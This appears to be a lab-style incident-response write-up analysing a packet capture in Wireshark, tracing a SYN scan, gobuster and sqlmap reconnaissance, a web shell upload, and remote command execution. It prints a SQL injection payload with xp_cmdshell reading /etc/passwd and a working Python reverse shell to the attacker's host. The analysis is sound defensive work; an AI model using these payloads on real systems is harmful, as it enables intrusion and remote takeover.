# Network Analysis - Web Shell

## Scenario

The SOC received an alert in their SIEM for 'Local to Local Port Scanning' where an internal private IP began scanning another internal system. I was provided with a `.pcap` file and I investigated if this activity is malicious or not, using **Wireshark** in a Kali virtual machine.

## Analysis

I opened the `.pcap` file in **Wireshark** and searched for the packets that correspond to the port scanning activity, these are typically `TCP` packets. 
I started looking for `SYN` packets, which are typical for port scanning. I applied the filter `tcp.flags.syn == 1` and I found numerous `SYN` packets from the source IP  address `10.251.96.4`.

![SYN Packets](../assets/syn-packets.png)

Next, I looked for the port range scanned by the suspicious host. To do that, I ordered the packets by the `Destination port` column and found a clear range of `1 - 1024`.

![1 - 1024 range](../assets/port-range-1-1024.png)

Since most of the packets are `SYN`, it indicates that the attacker is perfmorming a `SYN scan`, a stealthy scan that sends `SYN` packets to open ports but doesn't complete the `TCP handshake`, which is why it doesn't fully establish a connection.

To establish which tools were used to perform reconnaisance against open ports I started to search for signatures. First, I filtered `ip.dst == 10.251.96.5 && http.user_agent` to show all the packets with a user agent string to the target IP. 
I saw many `GET` request to different paths on the same domain, like `admin`, I inspected some of them and I found `gobuster 3.0.1` in the **User-Agent Header**.

![Gobuster found](../assets/gobuster.png)

To establish the second tool, I proceeded to check more `gobuster` packets, this time doing a `POST` request, and I noticed a URL with embedded SQL commands, a clear hint of a possilbe **SQL injection**: 

```
POST /?QLuT=8454%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
```

A quick research showed me that this is a typical **UNION SELECT** SQL injection payload designed to extract data from the database. The attacker is attempting to retrieve table names from the `information_schema.tables` table, which contains metadata about all tables in the database.

After analyzing the User agent I found another tool: `sqlmap 1.4.7`.

![SQLmap found](../assets/sqlmap.png)

Next question is the name of the PHP file through wich the attacker uploaded a web shell. To approach this, I looked in the `HTTP POST` requests using the filter `http.request.method == "POST"`. The attacker might have uploaded the shell through a `POST` request, which is common for file uploads. I search through the `POST` requests and in the **Referer** header of the `16102` package I found `http://10.251.96.5/editprofile.php`, so I concluded that the attacker interacred with the `editprofile.php` page on the server.

![editprofile.php file](../assets/editprofile-php-file.png)

To find out the name of the web shell that the attacker uploaded, I followed the TCP stream of the packet `16102` - which translates to`tcp.stream eq 1270`- this showed me the packet information and the plaintext of `fileToUpload`, which is `dbfunctions.php`.

![dbfunctions.php file](../assets/dbfunctions-php-file.png)

Next, to find the parameter used in the web shell for executing commands, I looked for interactions with `dbfunctions.php`:

```
http.request.uri contains "dbfunctions.php"
```

This filter checks for `GET` or `POST`requests that target the `dbfunctions.php` file. These requests often contain a parameter that the attacker is using to pass commands for execution.
In the results, I found a `cmd` parameter which contains **operating system commands** like `id` and `whoami`.

Ordering the packets by Number, I found out the first one in being executed is `id.`

![Cmd cparameter](../assets/cmd.png)

The next command being executed is clearly a Python script:

![Python script](../assets/python-script.png)

After cleaning it and indenting it this is the result:

```py
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("10.251.96.4", 4422))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

subprocess.call(["/bin/sh", "-i"])
```

This is a `reverse` shell to `10.251.96.4` to utilize `/bin/sh` through the port `4422`.

## Conclusion:

The `.pcap` analysis indicates that the IP `10.251.96.4` was used to conduct an attack on another system in the same network `10.251.93.5`. 

First, a stealthy `SYN` scan over the port range `1 - 1024`, followerd by reconnaisance using `Gobuster` to enumerate directories and `sqlmap` to exploiut a vulenrable web app via SQL injection.

Ther attacker exploited the `editprofile.php` endpoint to upload a malicious PHP web shell named `dbfunctions.php`. Once uploaded, the shell was accessed using a `cmd` parameter to execute OS-level commands remotely. Among these commands, a reverse shell was initiated using Python, establishing a connection to the attacker's machine `10.251.96.4:4422`.

The incident demonstrates a full kill chain: from reconnaissance and exploitation to post exploitation and remote access, and confirms that the activity was indeed **malicious**.